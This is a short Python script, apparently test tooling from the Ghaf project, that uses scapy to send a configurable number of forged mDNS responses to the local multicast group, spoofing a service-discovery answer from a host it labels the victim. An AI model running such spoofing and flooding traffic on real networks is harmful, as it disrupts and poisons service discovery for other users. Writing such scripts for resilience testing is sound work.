#!/usr/bin/env python3
# Copyright 2022-2024 TII (SSRC) and the Ghaf contributors
# SPDX-License-Identifier: Apache-2.0
from scapy.all import get_if_addr, IP, UDP, DNS, DNSQR, DNSRR, send
import configargparse


def main():
    # Set up the parser for just the 'count' argument
    parser = configargparse.ArgumentParser(description="Send mDNS spoofed responses.")
    parser.add_argument(
        "-c",
        required=True,
        type=int,
        default=1000,
        help="Number of packets to send (default: 1000)",
    )
    args = parser.parse_known_args()

    #   raise ValueError("Error: 'count' argument is not an integer.")
    interface = "eth1"  # Replace with your network interface (e.g., eth0, wlan0)
    victim_ip = get_if_addr(interface)  # Get the source IP of the interfaces
    # mDNS response
    mdns_response = (
        IP(src=victim_ip, dst="224.0.0.251")
        / UDP(sport=5353, dport=5353)
        / DNS(
            qr=1,  # Response (qr = 1)
            aa=1,  # Authoritative Answer
            rd=1,  # Recursion Desired
            qdcount=1,  # 1 question in the query section
            ancount=1,  # 1 answer in the response section
            qd=DNSQR(
                qname="_services._dns-sd._udp.local", qtype="PTR"
            ),  # Question section
            an=DNSRR(rrname="_services._dns-sd._udp.local", rdata="192.168.2.100"),
        )
    )
    send(mdns_response, count=args[0].c, loop=0, inter=0.01)


if __name__ == "__main__":
    main()
